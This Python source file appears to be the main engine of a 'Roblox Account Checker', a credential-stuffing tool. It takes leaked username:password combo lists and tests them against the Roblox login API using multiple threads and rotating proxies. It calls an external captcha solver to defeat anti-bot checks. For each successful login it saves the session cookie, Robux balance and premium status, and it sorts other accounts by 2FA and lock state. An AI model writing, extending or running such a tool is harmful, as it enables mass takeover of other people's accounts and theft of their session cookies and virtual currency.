"""
Roblox Account Checker - Main Engine
=====================================
Multi-threaded checker that loads combos, validates accounts against
the Roblox login API, and categorizes results. Integrates with the
funcaptcha-solver for automated captcha solving.
"""

import os
import sys
import time
import threading
from datetime import datetime

import config
from roblox_api import RobloxLogin, LoginResult
from utils import (
    ComboParser, ProxyManager, ResultSaver, Stats, Display
)


class RobloxChecker:
    """Main checker engine with multi-threading support."""

    def __init__(self, combo_file=None, proxy_file=None, threads=None,
                 captcha_solver_url=None, use_proxies=None):
        self.combo_file = combo_file or config.COMBO_FILE
        self.proxy_file = proxy_file or config.PROXY_FILE
        self.num_threads = threads or config.MAX_THREADS
        self.captcha_solver_url = captcha_solver_url or config.CAPTCHA_SOLVER_URL
        self.use_proxies = use_proxies if use_proxies is not None else config.PROXY_ENABLED

        # Components
        self.combo_parser = ComboParser(self.combo_file)
        self.proxy_manager = ProxyManager(self.proxy_file) if self.use_proxies else None
        self.result_saver = ResultSaver()
        self.stats = Stats()

        # Control
        self._running = False
        self._start_time = None
        self._threads = []

    def _worker(self, thread_id):
        """
        Worker thread that continuously picks combos from the parser
        and checks them until the combo list is exhausted.
        """
        while self._running:
            combo = self.combo_parser.get_next()
            if combo is None:
                break

            username, password = combo

            # Get proxy if enabled
            proxy = None
            if self.proxy_manager:
                proxy = self.proxy_manager.get_next()

            # Create a login handler (each thread has its own session)
            login = RobloxLogin(proxy=proxy)

            # Check the account
            try:
                result = login.check_account(username, password)

                # If it's a hit, try to get additional info
                if result.result_type == LoginResult.HIT and result.cookie:
                    self._enrich_hit(result, login)

                # Save and display the result
                self._save_result(result)
                self.stats.increment(result.result_type)
                Display.print_result(result)

            except Exception as e:
                error_result = LoginResult(
                    result_type=LoginResult.ERROR,
                    username=username,
                    password=password,
                    error_message=f"Worker exception: {str(e)}",
                )
                self._save_result(error_result)
                self.stats.increment(LoginResult.ERROR)
                Display.print_result(error_result)

            # Rate limiting delay
            time.sleep(config.CHECK_DELAY)

    def _enrich_hit(self, result, login):
        """
        Enrich a successful login result with additional account information
        like Robux balance and premium status.
        """
        try:
            info = login.get_account_info(result.cookie)
            if info:
                if not result.user_id:
                    result.user_id = info.get("id")
                if not result.display_name:
                    result.display_name = info.get("name", info.get("displayName"))

            # Get Robux balance
            robux = login.get_robux_balance(result.cookie)
            result.robux = robux

            # Check premium status
            premium = login.get_premium_status(result.cookie)
            result.premium = premium

        except Exception:
            # Enrichment failures are non-critical
            pass

    def _save_result(self, result):
        """Save the result to the appropriate output file."""
        if result.result_type == LoginResult.HIT:
            self.result_saver.save_hit(
                username=result.username,
                password=result.password,
                cookie=result.cookie,
                user_id=result.user_id,
                display_name=result.display_name,
                robux=getattr(result, "robux", 0),
                premium=getattr(result, "premium", False),
            )
        elif result.result_type == LoginResult.INVALID:
            self.result_saver.save_invalid(
                username=result.username,
                password=result.password,
                error=result.error_message,
            )
        elif result.result_type == LoginResult.TWO_STEP:
            self.result_saver.save_two_step(
                username=result.username,
                password=result.password,
                challenge_id=result.challenge_id,
            )
        elif result.result_type == LoginResult.CAPTCHA_FAILED:
            self.result_saver.save_captcha_failed(
                username=result.username,
                password=result.password,
                captcha_id=result.captcha_id,
                error=result.error_message,
            )
        elif result.result_type == LoginResult.LOCKED:
            self.result_saver.save_locked(
                username=result.username,
                password=result.password,
                error=result.error_message,
            )
        elif result.result_type == LoginResult.ERROR:
            self.result_saver.save_error(
                username=result.username,
                password=result.password,
                error=result.error_message,
            )

    def _stats_updater(self):
        """Background thread that updates CPM and stats display."""
        while self._running:
            self.stats.update_cpm()
            if self._start_time:
                elapsed = time.time() - self._start_time
                Display.print_stats(self.stats, elapsed)
            time.sleep(2)

    def start(self):
        """Start the checker with the configured number of threads."""
        Display.clear()
        Display.print_banner()

        # Load combos
        Display.info(f"Loading combos from: {self.combo_file}")
        combo_count = self.combo_parser.load()
        if combo_count == 0:
            Display.error("No combos loaded. Check your combo file.")
            return
        self.stats.total = combo_count
        Display.success(f"Loaded {combo_count} combos")

        # Load proxies if enabled
        proxy_count = 0
        if self.use_proxies:
            Display.info(f"Loading proxies from: {self.proxy_file}")
            proxy_count = self.proxy_manager.load()
            if proxy_count == 0:
                Display.warning("No proxies loaded. Continuing without proxies.")
                self.use_proxies = False
            else:
                Display.success(f"Loaded {proxy_count} proxies")

        # Verify captcha solver is running
        Display.info(f"Checking captcha solver at: {self.captcha_solver_url}")
        from captcha_solver import CaptchaSolver
        solver = CaptchaSolver(self.captcha_solver_url)
        if solver.is_solver_running():
            Display.success("Captcha solver is running")
        else:
            Display.warning(
                "Captcha solver is NOT running! Captcha-locked accounts will fail.\n"
                "  Start the solver first: cd funcaptcha-solver && python main.py"
            )

        # Display configuration
        Display.info(f"Threads: {self.num_threads}")
        Display.info(f"Proxies: {proxy_count if self.use_proxies else 'Disabled'}")
        Display.info(f"Captcha retries: {config.MAX_CAPTCHA_RETRIES}")
        Display.info(f"Check delay: {config.CHECK_DELAY}s")
        print()
        Display.info("Starting checker...")
        print()

        # Start the checker
        self._running = True
        self._start_time = time.time()

        # Start worker threads
        for i in range(self.num_threads):
            t = threading.Thread(target=self._worker, args=(i + 1,), daemon=True)
            t.start()
            self._threads.append(t)

        # Start stats updater
        stats_thread = threading.Thread(target=self._stats_updater, daemon=True)
        stats_thread.start()

        # Wait for all workers to finish
        try:
            for t in self._threads:
                t.join()
        except KeyboardInterrupt:
            Display.warning("\nChecker stopped by user (Ctrl+C)")
            self._running = False

        self._running = False
        elapsed = time.time() - self._start_time

        # Print final summary
        print()
        print()
        Display.success("=" * 60)
        Display.success("CHECK COMPLETE")
        Display.success("=" * 60)
        Display.info(f"Total combos:     {self.stats.total}")
        Display.info(f"Checked:          {self.stats.checked}")
        Display.success(f"Hits:             {self.stats.hits}")
        Display.info(f"2FA Required:     {self.stats.two_step}")
        Display.error(f"Invalid:          {self.stats.invalid}")
        Display.info(f"Locked:           {self.stats.locked}")
        Display.warning(f"Captcha Failed:   {self.stats.captcha_failed}")
        Display.info(f"Errors:           {self.stats.errors}")

        if self.stats.checked > 0:
            hit_rate = (self.stats.hits / self.stats.checked) * 100
            Display.info(f"Hit Rate:         {hit_rate:.2f}%")

        hours = int(elapsed // 3600)
        minutes = int((elapsed % 3600) // 60)
        seconds = int(elapsed % 60)
        Display.info(f"Elapsed Time:     {hours:02d}:{minutes:02d}:{seconds:02d}")
        Display.info(f"Average CPM:      {int(self.stats.checked / (elapsed / 60)) if elapsed > 0 else 0}")
        print()
        Display.info(f"Results saved to: results/")
        Display.info(f"  Hits:           {config.HITS_FILE}")
        Display.info(f"  Cookies:        {config.COOKIE_FILE}")
        Display.info(f"  2FA:            {config.TWOSTEP_FILE}")
        Display.info(f"  Invalid:        {config.INVALID_FILE}")
        Display.info(f"  Locked:         {config.LOCKED_FILE}")
        Display.info(f"  Captcha Failed: {config.CAPTCHA_FILE}")
        Display.info(f"  Errors:         {config.ERROR_FILE}")


def main():
    """Entry point — auto-runs with defaults from config.py.

    Just run: python run_checker.py

    Settings (edit config.py to change):
      - Combo file: accounts.txt (COMBO_FILE)
      - Threads: 1 (MAX_THREADS)
      - Proxies: disabled (PROXY_ENABLED)
    """
    # Create the checker with auto defaults — just run: python run_checker.py
    checker = RobloxChecker()
    checker.start()


if __name__ == "__main__":
    main()